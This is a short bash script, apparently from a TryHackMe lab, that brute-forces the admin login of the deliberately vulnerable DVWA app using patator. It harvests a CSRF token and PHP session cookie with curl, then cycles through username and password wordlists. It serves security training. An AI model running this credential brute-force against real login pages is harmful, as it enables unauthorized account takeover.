#!/bin/bash
# Bruteforce the Admin login HTTP FORM of the DVWA 1.10+
# with security set to "impossible"
# using patator 0.9+ (https://github.com/lanjelot/patator)...
#
# Enhanced and fixed the version provided by TryHackMe, wich sadly,
# did not work for me AT ALL (https://tryhackme.com/room/bruteforceheroes).

# SETUP: Change this to your target URL _without_ trailing slash, path to user and passwordlists...
TARGET_URL="http://10.10.78.87"
USER_LIST="/usr/share/seclists/usernames.txt"
PASS_LIST="/usr/share/wordlists/1500-worst-passwords.txt"

# Use curl to get a cookie, save it and extract the PHP Session ID:
CSRF_TOKEN=$(curl -s -c dvwa.cookie "${TARGET_URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSION_ID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')

echo -e "\nHarvested CSRF Token: $(tput setaf 3)${CSRF_TOKEN}$(tput sgr0)"
echo -e "PHP Session ID: $(tput setaf 3)${SESSION_ID}$(tput sgr0)\n\n"

patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=5  timeout=10 \
  url="${TARGET_URL}/login.php" \
  0=${USER_LIST}  1=${PASS_LIST} \
  body="username=FILE0&password=FILE1&user_token=${CSRF_TOKEN}&Login=Login" \
  header="Cookie: security=impossible; PHPSESSID=${SESSION_ID}" \
  -x quit:fgrep=index.php \
  -x ignore:fgrep=login.php

# Clean up the cookie:
rm -f ./dvwa.cookie
